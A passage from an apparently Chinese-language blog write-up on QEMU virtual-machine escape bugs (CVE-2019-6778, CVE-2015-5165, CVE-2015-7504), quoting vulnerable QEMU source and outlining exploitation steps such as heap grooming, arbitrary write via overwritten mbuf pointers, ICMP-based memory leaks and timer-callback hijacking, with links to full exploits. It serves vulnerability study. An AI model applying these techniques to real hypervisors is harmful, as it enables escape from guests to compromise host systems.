m_flags;        <span class="comment">/* Misc flags */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span>    m_size;            <span class="comment">/* Size of mbuf, from m_dat or m_ext */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>    <span class="title">socket</span> *<span class="title">m_so</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">caddr_t</span>    m_data;            <span class="comment">/* Current location of data */</span></span><br><span class="line">    <span class="keyword">int</span>    m_len;            <span class="comment">/* Amount of data in this mbuf, from m_data */</span></span><br><span class="line"></span><br><span class="line">    Slirp *slirp;</span><br><span class="line">    <span class="keyword">bool</span>    resolution_requested;</span><br><span class="line">    <span class="keyword">uint64_t</span> expiration_date;</span><br><span class="line">    <span class="keyword">char</span>   *m_ext;</span><br><span class="line">    <span class="comment">/* start of dynamic buffer area, must be last element */</span></span><br><span class="line">    <span class="keyword">char</span>    m_dat[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sbuf</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> sb_cc;        <span class="comment">/* actual chars in buffer */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> sb_datalen;    <span class="comment">/* Length of data  */</span></span><br><span class="line">    <span class="keyword">char</span>    *sb_wptr;    <span class="comment">/* write pointer. points to where the next</span></span><br><span class="line"><span class="comment">                 * bytes should be written in the sbuf */</span></span><br><span class="line">    <span class="keyword">char</span>    *sb_rptr;    <span class="comment">/* read pointer. points to where the next</span></span><br><span class="line"><span class="comment">                 * byte should be read from the sbuf */</span></span><br><span class="line">    <span class="keyword">char</span>    *sb_data;    <span class="comment">/* Actual data */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当m-&gt;m_data中没有’n’或’r’的时候，进不了if，所以so_rcv-&gt;sb_cc不会被更新；这时当不断往<code>so_rcv-&gt;sb_wptr</code>中拷贝数据时，该指针后移，长度却未增加，早晚堆溢出。</p><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><h4 id="malloc原语"><a href="#malloc原语" class="headerlink" title="malloc原语"></a>malloc原语</h4><p>为了完成堆风水，要先清理一下内存，使我们想分配的两块内存能从top chunck割，是紧挨着的；可以看下ip分片的实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">ip_input(struct mbuf *m)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * If offset or IP_MF are set, must reassemble.</span></span><br><span class="line"><span class="comment">     * Otherwise, nothing need be done.</span></span><br><span class="line"><span class="comment">     * (We could look in the reassembly queue to see</span></span><br><span class="line"><span class="comment">     * if the packet was previously fragmented,</span></span><br><span class="line"><span class="comment">     * but it's not worth the time; just let them time out.)</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * XXX This should fail, don't fragment yet</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (ip-&gt;ip_off &amp;~ IP_DF) &#123;</span><br><span class="line">      <span class="keyword">register</span> <span class="class"><span class="keyword">struct</span> <span class="title">ipq</span> *<span class="title">fp</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">qlink</span> *<span class="title">l</span>;</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Look for queue of fragments</span></span><br><span class="line"><span class="comment">         * of this datagram.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">for</span> (l = slirp-&gt;ipq.ip_link.next; l != &amp;slirp-&gt;ipq.ip_link;</span><br><span class="line">             l = l-&gt;next) &#123;</span><br><span class="line">            fp = container_of(l, struct ipq, ip_link);</span><br><span class="line">            <span class="keyword">if</span> (ip-&gt;ip_id == fp-&gt;ipq_id &amp;&amp;</span><br><span class="line">                    ip-&gt;ip_src.s_addr == fp-&gt;ipq_src.s_addr &amp;&amp;</span><br><span class="line">                    ip-&gt;ip_dst.s_addr == fp-&gt;ipq_dst.s_addr &amp;&amp;</span><br><span class="line">                    ip-&gt;ip_p == fp-&gt;ipq_p)</span><br><span class="line">            <span class="keyword">goto</span> found;</span><br><span class="line">        &#125;</span><br><span class="line">        fp = <span class="literal">NULL</span>;</span><br><span class="line">    found:</span><br><span class="line">        ip-&gt;ip_len -= hlen;</span><br><span class="line">        <span class="keyword">if</span> (ip-&gt;ip_off &amp; IP_MF)</span><br><span class="line">          ip-&gt;ip_tos |= <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          ip-&gt;ip_tos &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        ip-&gt;ip_off &lt;&lt;= <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * If datagram marked as having more fragments</span></span><br><span class="line"><span class="comment">         * or if this is not the first fragment,</span></span><br><span class="line"><span class="comment">         * attempt reassembly; if it succeeds, proceed.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (ip-&gt;ip_tos &amp; <span class="number">1</span> || ip-&gt;ip_off) &#123;</span><br><span class="line">            ip = ip_reass(slirp, ip, fp);</span><br><span class="line">                        <span class="keyword">if</span> (ip == <span class="literal">NULL</span>)</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> *</span></span><br><span class="line"><span class="class"><span class="title">ip_reass</span>(<span class="title">Slirp</span> *<span class="title">slirp</span>, <span class="title">struct</span> <span class="title">ip</span> *<span class="title">ip</span>, <span class="title">struct</span> <span class="title">ipq</span> *<span class="title">fp</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * If first fragment to arrive, create a reassembly queue.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">        <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">t</span> = <span class="title">m_get</span>(<span class="title">slirp</span>)</span></span><br><span class="line"><span class="class">        &#125;</span></span><br><span class="line"><span class="class">      ...</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">#<span class="title">define</span> <span class="title">SLIRP_MSIZE</span></span></span><br><span class="line"><span class="class">    (<span class="title">offsetof</span>(<span class="title">struct</span> <span class="title">mbuf</span>, <span class="title">m_dat</span>) + <span class="title">IF_MAXLINKHDR</span> + <span class="title">TCPIPHDR_DELTA</span> + <span class="title">IF_MTU</span>)</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">mbuf</span> *</span></span><br><span class="line"><span class="class"><span class="title">m_get</span>(<span class="title">Slirp</span> *<span class="title">slirp</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">register</span> <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">m</span>;</span></span><br><span class="line">    <span class="keyword">int</span> flags = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    DEBUG_CALL(<span class="string">"m_get"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (slirp-&gt;m_freelist.qh_link == &amp;slirp-&gt;m_freelist) &#123;</span><br><span class="line">                m = g_malloc(SLIRP_MSIZE);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到当数据包是数据流中第一个切片的数据包时，会为其分配一个大小为0x668的struct mbuf，并一直挂在链表中，所以这0x670可以用来清理堆内存。</p><h4 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">ip_input(struct mbuf *m)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * If offset or IP_MF are set, must reassemble.</span></span><br><span class="line"><span class="comment">     * Otherwise, nothing need be done.</span></span><br><span class="line"><span class="comment">     * (We could look in the reassembly queue to see</span></span><br><span class="line"><span class="comment">     * if the packet was previously fragmented,</span></span><br><span class="line"><span class="comment">     * but it's not worth the time; just let them time out.)</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * XXX This should fail, don't fragment yet</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (ip-&gt;ip_off &amp;~ IP_DF) &#123;</span><br><span class="line">      <span class="keyword">register</span> <span class="class"><span class="keyword">struct</span> <span class="title">ipq</span> *<span class="title">fp</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">qlink</span> *<span class="title">l</span>;</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Look for queue of fragments</span></span><br><span class="line"><span class="comment">         * of this datagram.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">for</span> (l = slirp-&gt;ipq.ip_link.next; l != &amp;slirp-&gt;ipq.ip_link;</span><br><span class="line">             l = l-&gt;next) &#123;</span><br><span class="line">            fp = container_of(l, struct ipq, ip_link);</span><br><span class="line">            <span class="keyword">if</span> (ip-&gt;ip_id == fp-&gt;ipq_id &amp;&amp;</span><br><span class="line">                    ip-&gt;ip_src.s_addr == fp-&gt;ipq_src.s_addr &amp;&amp;</span><br><span class="line">                    ip-&gt;ip_dst.s_addr == fp-&gt;ipq_dst.s_addr &amp;&amp;</span><br><span class="line">                    ip-&gt;ip_p == fp-&gt;ipq_p)</span><br><span class="line">            <span class="keyword">goto</span> found;</span><br><span class="line">        &#125;</span><br><span class="line">        fp = <span class="literal">NULL</span>;</span><br><span class="line">    found:</span><br><span class="line">        ip-&gt;ip_len -= hlen;</span><br><span class="line">        <span class="keyword">if</span> (ip-&gt;ip_off &amp; IP_MF)</span><br><span class="line">          ip-&gt;ip_tos |= <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          ip-&gt;ip_tos &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        ip-&gt;ip_off &lt;&lt;= <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * If datagram marked as having more fragments</span></span><br><span class="line"><span class="comment">         * or if this is not the first fragment,</span></span><br><span class="line"><span class="comment">         * attempt reassembly; if it succeeds, proceed.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (ip-&gt;ip_tos &amp; <span class="number">1</span> || ip-&gt;ip_off) &#123;</span><br><span class="line">            ip = ip_reass(slirp, ip, fp);</span><br><span class="line">                        <span class="keyword">if</span> (ip == <span class="literal">NULL</span>)</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> *</span></span><br><span class="line"><span class="class"><span class="title">ip_reass</span>(<span class="title">Slirp</span> *<span class="title">slirp</span>, <span class="title">struct</span> <span class="title">ip</span> *<span class="title">ip</span>, <span class="title">struct</span> <span class="title">ipq</span> *<span class="title">fp</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">register</span> <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">m</span> = <span class="title">dtom</span>(<span class="title">slirp</span>, <span class="title">ip</span>);</span></span><br><span class="line">    <span class="keyword">register</span> <span class="class"><span class="keyword">struct</span> <span class="title">ipasfrag</span> *<span class="title">q</span>;</span></span><br><span class="line">    <span class="keyword">int</span> hlen = ip-&gt;ip_hl &lt;&lt; <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> i, next;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Reassembly is complete; concatenate fragments.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    q = fp-&gt;frag_link.next;</span><br><span class="line">    m = dtom(slirp, q);</span><br><span class="line"></span><br><span class="line">    q = (struct ipasfrag *) q-&gt;ipf_next;</span><br><span class="line">    <span class="keyword">while</span> (q != (struct ipasfrag*)&amp;fp-&gt;frag_link) &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">t</span> = <span class="title">dtom</span>(<span class="title">slirp</span>, <span class="title">q</span>);</span></span><br><span class="line">      q = (struct ipasfrag *) q-&gt;ipf_next;</span><br><span class="line">      m_cat(m, t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copy data from one mbuf to the end of</span></span><br><span class="line"><span class="comment"> * the other.. if result is too big for one mbuf, allocate</span></span><br><span class="line"><span class="comment"> * an M_EXT data segment</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">m_cat(struct mbuf *m, struct mbuf *n)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * If there's no room, realloc</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (M_FREEROOM(m) &lt; n-&gt;m_len)</span><br><span class="line">        m_inc(m, m-&gt;m_len + n-&gt;m_len);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(m-&gt;m_data+m-&gt;m_len, n-&gt;m_data, n-&gt;m_len);</span><br><span class="line">    m-&gt;m_len += n-&gt;m_len;</span><br><span class="line"></span><br><span class="line">    m_free(n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，当数据包是最后一个切片时，会在<code>ip_reass</code>中调用<code>m_cat</code>将数据包组合起来，关键的部分是<code>memcpy(m-&gt;m_data+m-&gt;m_len, n-&gt;m_data, n-&gt;m_len);</code>；我们可以通过溢出覆盖<code>m-&gt;m_data</code>达到任意地址写。</p><h4 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h4><p>主要是利用伪造ICMP响应请求包，得到响应应答包实现。</p><ol><li>溢出修改m_data的低位，在堆的前面写入一个伪造的ICMP包头。</li><li>发送一个ICMP请求，将MF bit置位（1）。</li><li>第二次溢出修改第二步的m_data的低位至伪造的包头地址。</li><li>发送MF bit为0的包结束ICMP请求。</li><li>得到ICMP应答包，实现信息泄露。</li></ol><h4 id="劫持eip"><a href="#劫持eip" class="headerlink" title="劫持eip"></a>劫持eip</h4><p>经过上述步骤我们已经可以了，所以这里又是<code>QEMUTimer</code>。</p><p>bss段有个全局数组<code>main_loop_tlg</code>，它是<code>QEMUTimerList</code>的数组；我们可以在堆中伪造一个<code>QEMUTimerList</code>，将<code>cb</code>指针覆盖成想要执行的函数，<code>opaque</code>为参数地址；再将其地址覆盖到<code>main_loop_tlg</code>中，等<code>expire_time</code>时间到，会执行<code>cb(opaque)</code>。</p><h4 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h4><p><a href="https://github.com/ray-cp/vm-escape/blob/master/qemu-escape/cve-2019-6778/exp.c">exp.c</a></p><h2 id="qemu-pwn-cve-2015-5165信息泄露漏洞分析"><a href="#qemu-pwn-cve-2015-5165信息泄露漏洞分析" class="headerlink" title="qemu-pwn-cve-2015-5165信息泄露漏洞分析"></a>qemu-pwn-cve-2015-5165信息泄露漏洞分析</h2><p>CVE-2015-5165和CVE-2015-7504，很经典的一对qemu逃逸漏洞。</p><h3 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>先看漏洞相关代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint8_t</span> *saved_buffer  = s-&gt;cplus_txbuffer;</span><br><span class="line"><span class="keyword">int</span>      saved_size    = s-&gt;cplus_txbuffer_offset;</span><br><span class="line"><span class="keyword">int</span>      saved_buffer_len = s-&gt;cplus_txbuffer_len;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (txdw0 &amp; (CP_TX_IPCS | CP_TX_UDPCS | CP_TX_TCPCS | CP_TX_LGSEN))</span><br><span class="line">&#123;</span><br><span class="line">    DPRINTF(<span class="string">"+++ C+ mode offloaded task checksumn"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ip packet header */</span></span><br><span class="line">    ip_header *ip = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> hlen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint8_t</span>  ip_protocol = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint16_t</span> ip_data_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> *eth_payload_data = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">size_t</span>   eth_payload_len  = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> proto = be16_to_cpu(*(<span class="keyword">uint16_t</span> *)(saved_buffer + <span class="number">12</span>));</span><br><span class="line">    <span class="keyword">if</span> (proto == ETH_P_IP)</span><br><span class="line">    &#123;</span><br><span class="line">        DPRINTF(<span class="string">"+++ C+ mode has IP packetn"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* not aligned */</span></span><br><span class="line">        eth_payload_data = saved_buffer + ETH_HLEN;</span><br><span class="line">        eth_payload_len  = saved_size   - ETH_HLEN;</span><br><span class="line"></span><br><span class="line">        ip = (ip_header*)eth_payload_data;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (IP_HEADER_VERSION(ip) != IP_HEADER_VERSION_4) &#123;</span><br><span class="line">            DPRINTF(<span class="string">"+++ C+ mode packet has bad IP version %d "</span></span><br><span class="line">                <span class="string">"expected %dn"</span>, IP_HEADER_VERSION(ip),</span><br><span class="line">                IP_HEADER_VERSION_4);</span><br><span class="line">            ip = <span class="literal">NULL</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            hlen = IP_HEADER_LENGTH(ip);</span><br><span class="line">            ip_protocol = ip-&gt;ip_p;</span><br><span class="line">            ip_data_len = be16_to_cpu(ip-&gt;ip_len) - hlen;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>ip_data_len = be16_to_cpu(ip-&gt;ip_len) - hlen;</code>没有对长度进行检查，当<code>be16_to_cpu(ip-&gt;ip_len)</code>小于20时，产生溢出，<code>ip_data_len</code>为负数，最后发送ip数据包的时候，会泄露内存数据。</p><p>再康康泄露部分的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment">/* pointer to TCP header */</span></span><br><span class="line">tcp_header *p_tcp_hdr = (tcp_header*)(eth_payload_data + hlen);</span><br><span class="line"><span class="comment">/* ETH_MTU = ip header len + tcp header len + payload */</span></span><br><span class="line"><span class="keyword">int</span> tcp_data_len = ip_data_len - tcp_hlen;</span><br><span class="line"><span class="keyword">int</span> tcp_chunk_size = ETH_MTU - hlen - tcp_hlen;</span><br><span class="line">...</span><br><span class="line"><span class="comment">/* note the cycle below overwrites IP header data,</span></span><br><span class="line"><span class="comment">    but restores it from saved_ip_header before sending packet */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> is_last_frame = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (tcp_send_offset = <span class="number">0</span>; tcp_send_offset &lt; tcp_data_len; tcp_send_offset += tcp_chunk_size)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> chunk_size = tcp_chunk_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check if this is the last frame */</span></span><br><span class="line">    <span class="keyword">if</span> (tcp_send_offset + tcp_chunk_size &gt;= tcp_data_len)</span><br><span class="line">    &#123;</span><br><span class="line">        is_last_frame = <span class="number">1</span>;</span><br><span class="line">        chunk_size = tcp_data_len - tcp_send_offset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcp_send_offset)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="keyword">uint8_t</span>*)p_tcp_hdr + tcp_hlen, (<span class="keyword">uint8_t</span>*)p_tcp_hdr + tcp_hlen + tcp_send_offset, chunk_size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    rtl8139_transfer_frame(s, saved_buffer, tso_send_size,</span><br><span class="line">        <span class="number">0</span>, (<span class="keyword">uint8_t</span> *) dot1q_buffer);</span><br></pre></td></tr></table></figure><p>可见<code>memcpy((uint8_t*)p_tcp_hdr + tcp_hlen, (uint8_t*)p_tcp_hdr + tcp_hlen + tcp_send_offset, chunk_size);</code>会将<code>p_tcp_hdr</code>正常的数据以外的数据拷贝出来，通过<code>rtl8139_transfer_frame</code>发送出去。</p><p>大致漏洞产生如下：</p><ul><li>tx缓冲区中包含了要发送的数据包，在发送的过程中，因为没有对ip-&gt;ip_len进行检查，导致程序判定tcp的数据包长度超出了原有的长度，因此会将数据包进行切割将数据发送出去，导致了非预期的信息泄露；</li><li>同时当Tx标志位包含TxLoopBack时，会将数据包发送给自己的网卡并且发送数据的mac地址为自身网卡以及rx标志位包含AcceptAllPhys时会将相应的数据保存到rx缓冲区中，因此构造好相应的数据我们就可以从rx缓冲区的数据中读取到信息泄露的数据。</li></ul><h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><ul><li>恶意网卡发送数据包的构造</li><li>网卡寄存器的配置</li><li>网卡发送缓冲区的配置</li><li>网卡接收缓冲区的配置</li><li>泄露信息的分析</li></ul><h3 id="完整exp-2"><a href="#完整exp-2" class="headerlink" title="完整exp"></a>完整exp</h3><p><a href="https://github.com/ray-cp/vm-escape/tree/master/qemu-escape/cve-2015-5165_and_cve-2015-7504">exp</a></p><h2 id="qemu-pwn-cve-2015-7504堆溢出漏洞分析"><a href="#qemu-pwn-cve-2015-7504堆溢出漏洞分析" class="headerlink" title="qemu-pwn-cve-2015-7504堆溢出漏洞分析"></a>qemu-pwn-cve-2015-7504堆溢出漏洞分析</h2><h3 id="漏洞点-3"><a href="#漏洞点-3" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> <span class="function">print <span class="title">pcnet_receive</span><span class="params">(NetClientState *nc, <span class="keyword">const</span> <span class="keyword">uint8_t</span> *buf, <span class="keyword">size_t</span> size_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      <span class="keyword">int</span> size = size_;</span><br><span class="line">      PCNetState *s = qemu_get_nic_opaque(nc);</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">                  <span class="keyword">uint8_t</span> *src = s-&gt;buffer;</span><br><span class="line">                      ....</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s-&gt;looptest == PCNET_LOOPTEST_CRC ||</span><br><span class="line">                       